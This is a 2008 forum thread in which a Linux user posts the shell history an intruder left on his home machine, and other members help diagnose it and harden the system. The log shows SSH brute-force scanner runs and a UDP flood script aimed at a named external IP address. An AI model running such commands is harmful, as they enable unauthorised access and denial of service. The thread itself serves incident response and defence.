---
title: "I have been hacked!!!"
date: 2008-03-27
forum: Security Discussions
---

### Post by rcbarb1 on 2008-03-27
I have just logged into my mythtv machine from work and noticed inputs that clearly were not mine. 

( in reverse order)

./unix 129.88
./unix 130.134
./unix 163.75
./unix 163.54
./unix 163.47
./unix 163.32
./unix 163.16
chmod +x *
cd unixcod
ls -a
cd /tmp
./unix 87.21
./unix 87.17
./unix 87.12
./unix 87.124
./unix 87.120
./unix 87.118
chmod +x *
cd unixcod
tar xzvf unicod.tar.gz
wget [COLOR="Red"]<snip>[/COLOR]
cd /tmp
ls -a
cd
ls -a
cd /tmp
ls -a
cd /t,p
exit
cat /proc/cpuinfo
ps x
ls -a
cd /tmp
cat /proc/cpuinfo
w
./ssh-scan 100
mv 87.210.pscan.22 mfu.txt
./pscan2 87.210 22
chmod +x *
cd .gugu2
rm -rf gugu2.tar.gx
tar xzvf gugu2.tar.gz
wget [COLOR="Red"]<snip>[/COLOR]
cd /tmp
w
perl udp.pl 87.118.121.215 0 0
tar xzvf udp.tgz
wget [COLOR="Red"]<snip>[/COLOR]
cd /tmp
ls -a
dir
cd /tmp
w
cat /proc/cpuinfo
uname -a
w
./unix 125.102
./unix 125.90
./unix 125.63
./unix 125.48
./unix 125.17
./unix 130.160
./unix 137.145
./unix 137.125
./unix 137.106
/unix 137.81
/unix 137.63
/unix 137.44
/unix 137.22
chmod +x *
cd unixcod
tar xzvf unixcod.tar.gz
wget [COLOR="Red"]<snip>[/COLOR]
cd /tmp
cat /proc/cpuinfo
ls -a
cd
ls -a
cd /tmp
./unix 129.130
./unix 129.176
./unix 129.135
./unix 129.110
./unix 129.88
./unix 129.69
./unix 129.51
./unix 129.36
./unix 129.15
chmod +x *
cd unixcod
tar xzvf unixcod.tar.gz
wget [COLOR="Red"]<snip>[/COLOR]
cd /tmp
uname -a
w
cat /proc/cpuinfo
ps x



What have they done to my PC???

Could anyone advise me? Any help would be welcome.

Richard

---

### Post by renzokuken on 2008-03-27
looks like they are trying to run a script on your system.

only way to tell what they are doing is to inspect the contents of the unixcod archive, but not entirely sure i would recommend this

---

### Post by wieman01 on 2008-03-27
Reinstall your system... That's the only way to keep'em out in future.

---

### Post by rcbarb1 on 2008-03-27
Thanks guys. I will of course reinstall, Have you seen this before?

---

### Post by wieman01 on 2008-03-27
I have never been hacked so far. I just think renzokuken is right with what he/she has pointed out.

---

### Post by renzokuken on 2008-03-27
> **wieman01 said:**
> I have never been hacked so far. I just think renzokuken is right with what he/she has pointed out.

**he**, lol.....

definately seems malicious though

EDIT: see here [http://marcroger.com/hacking/review-unixcod/](http://marcroger.com/hacking/review-unixcod/) and here [http://ubuntuforums.org/showthread.php?t=253373](http://ubuntuforums.org/showthread.php?t=253373) 

appears to be some script kiddie trying to scan your ports and crack into your system

---

### Post by mozetti on 2008-03-27
FYI - I reported the OPs post. Those links shouldn't be active, if they're even listed at all. I explained in my report that it appears the OP didn't have malicious intent, but the links need to be removed.

---

### Post by renzokuken on 2008-03-27
very good point

---

### Post by wieman01 on 2008-03-27
Done. Now back on topic... Thanks, guys.

---

### Post by PriceChild on 2008-03-27
As far as I can tell, all it does is try to ssh into your machine, using lots of different user/pass combos... don't quote me on this though.

I suggest backing up all important data (any scripts or executables should be *thoroughly* checked if being backed up) and reinstalling. You just don't know what else they might have done.

You might also want to keep the logs from /var/logs... i guess auth.log might be a good read to see how they got access to your system.

If you find out the got in through ssh then be more careful next time, set up public key etc. etc.

---

### Post by hyper_ch on 2008-03-27
with hosts deny or fail2ban such tools can easily be rendered useless.... e.g. set ban rule of 3 wrong passwords per 10min from an ip....

---

### Post by renzokuken on 2008-03-27
you may want to check your /etc/passwd file and see if they added a new user.......and alse see if they created a personal directory in /home

EDIT: this has some useful info
[http://www.ducea.com/2006/07/17/how-to-restore-a-hacked-linux-server/](http://www.ducea.com/2006/07/17/how-to-restore-a-hacked-linux-server/)

---

### Post by rcbarb1 on 2008-03-27
Thanks all for your help. I will research my security ALOT more in future.

Richard

---

### Post by LivingSouL on 2008-03-27
Hello

I am the author of marcroger.com and the reason why they've got in to your pc is weak passwords. Maybe you have a user on your system that has weak passwords, like for example a "guest" user with a "guest" password, those scanners they've used can easily get those kinds of passwords. I suggest set your users passwords that aren't on any dictionary, has numerical combinations on it or something else which is strong. :)

./marc

---

### Post by moonpup on 2008-03-27
I've seen that udp.pl perl script before... assuming it's the same one, it's used to send a udp flood to another computer.

---

### Post by rcbarb1 on 2008-03-27
Would that be an internal or external machine that is the target? 
Or could it be either?

---

### Post by moonpup on 2008-03-27
From your initial post...

perl udp.pl 87.118.121.215 0 0
tar xzvf udp.tgz
wget <snip>

looks like the cracker downloaded the file, unzipped it and launched it against the host above. and to answer your question you can use it on either.

---

### Post by SuperMike on 2008-03-29
The way I prevent getting hacked:

* Make backups of my critical stuff.
* I use 3 firewalls -- one local on my DSL modem, one on my DSL router hub, and then another on my workstation with iptables.
* My root password is changed periodically and has a mega tough password.
* All other accounts are set with tough passwords and are changed at least every 4 months.
* I only install items from trusted sources.

---

### Post by tubasoldier on 2008-03-29
There are all sorts of tutorials for creating strong and tough passwords. The greatest advice I have been given is to use at least two special characters (ie. !@#$.....), at least two capital letters, at least two lowercase letters, and at least eight characters long. Also never use words out of a dictionary. 
Don't use computer generated passwords as defaults either. If a computer generated it, then it is more likely another computer will regenerate it. Although the likelyhood would be very low.

---

### Post by netlogic on 2008-03-29
Seriously, passwords are just a bad idea for ssh. You are asking for a trouble if you have password logins and opening up your ssh to the world. The vanilla default settings in most Linux distros are very insecure. Always use ssh keys if you are planning to open up your port to the world. It is a must. UNIX machines get hack all the time due to weak 8 character passwords people use. Ssh key with least 16 characters long passphrase is a must. Make sure your passphrase isn't your account password. Even they steal your keys, it would take a while to get the root privilege.  If you live others or if you let others use your machine, please encrypt the /home/user directory. That way even they have a physical access, they can't steal your ssh keys.

---

### Post by saj0577 on 2008-03-29
> **hyper_ch said:**
> with hosts deny or fail2ban such tools can easily be rendered useless.... e.g. set ban rule of 3 wrong passwords per 10min from an ip....
Any guides on doing this? Is it possible to make it so its only active on certain user accounts etc?

Saj

---

### Post by hyper_ch on 2008-03-31
not that I know for individual accounts.... 3 times wrong credentials within a given time-frame --> ban of that IP!

[http://www.howtoforge.com/preventing_ssh_dictionary_attacks_with_denyhosts](http://www.howtoforge.com/preventing_ssh_dictionary_attacks_with_denyhosts)

[http://www.howtoforge.com/fail2ban_debian_etch](http://www.howtoforge.com/fail2ban_debian_etch)

there's a lot of server based stuff on howtoforge...

---

### Post by netlogic on 2008-03-31
With a crafty social engineering, passwords will always fail.  You will be surprised how sysadmins use the same passwords for their pop mail, myspace, and other social network sites. Most humans can remember only six complex passwords in their heads.

---

